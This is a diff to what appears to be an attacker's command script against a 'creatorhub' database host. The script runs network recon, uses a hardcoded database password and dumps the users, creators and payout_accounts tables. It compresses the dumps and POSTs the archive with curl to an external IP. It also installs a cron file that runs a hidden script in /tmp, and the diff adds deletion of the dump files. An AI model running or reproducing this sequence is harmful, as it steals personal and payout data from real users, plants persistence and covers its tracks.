@@ -8,12 +8,13 @@ ss -plant
 ip a
 getent hosts db01
 PGPASSWORD='Sup3rS3cret!' psql -h 10.10.10.12 -U api -d creatorhub -c "\dt"
-PGPASSWORD='Sup3rS3cret!' pg_dump -h 10.10.10.12 -U api -d creatorhub --table=users > /tmp/u.sql
-PGPASSWORD='Sup3rS3cret!' pg_dump -h 10.10.10.12 -U api -d creatorhub --table=creators > /tmp/c.sql
-PGPASSWORD='Sup3rS3cret!' pg_dump -h 10.10.10.12 -U api -d creatorhub --table=payout_accounts > /tmp/p.sql
-cat /tmp/u.sql /tmp/c.sql /tmp/p.sql | gzip > /tmp/.cache.tgz
-curl -k -X POST --data-binary @/tmp/.cache.tgz https://185.199.110.153/upload
+PGPASSWORD='Sup3rS3cret!' pg_dump -h 10.10.10.12 -U api -d creatorhub --table=users > /tmp/users.sql
+PGPASSWORD='Sup3rS3cret!' pg_dump -h 10.10.10.12 -U api -d creatorhub --table=creators > /tmp/creators.sql
+PGPASSWORD='Sup3rS3cret!' pg_dump -h 10.10.10.12 -U api -d creatorhub --table=payout_accounts > /tmp/payout_accounts.sql
+cat /tmp/users.sql /tmp/creators.sql /tmp/payout_accounts.sql | gzip > /tmp/data.tar.gz
+curl -k -X POST --data-binary @/tmp/data.tar.gz https://185.199.110.153/upload
 printf '#!/bin/bash
 [ -f /tmp/.backup.sh ] || exit 0
 /bin/bash /tmp/.backup.sh
 ' > /etc/cron.d/zz-sysupd
+rm -f /tmp/users.sql /tmp/creators.sql /tmp/payout_accounts.sql
